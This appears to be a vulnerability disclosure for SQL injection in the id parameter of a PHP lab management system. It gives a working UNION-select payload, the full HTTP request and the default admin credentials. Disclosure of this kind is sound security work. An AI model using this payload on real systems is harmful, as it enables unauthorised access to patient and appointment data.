# Online Diagnostic Lab Management System v1.0 by oretnom23 has SQL injection

BUG_Author: Happyd99

Login account: admin/admin123 (Super Admin account)

Login account: cblake@sample.com/cblake123 (General account)

vendors: https://www.sourcecodester.com/php/15129/online-diagnostic-lab-management-system-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /odlms/?page=appointments/view_appointment&id=

Vulnerability location: /odlms/?page=appointments/view_appointment&id=,id

dbname=odlms_db,length=8

[+] Payload: /odlms/?page=appointments/view_appointment&id=-5%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13--+ // Leak place ---> id

```sql
GET /odlms/?page=appointments/view_appointment&id=-5%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=5g4g4dffu1bkrg9jm7nr42ori2
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/191254094-fbd25f4b-ebd2-4e9d-8412-ee5cb2092039.png)
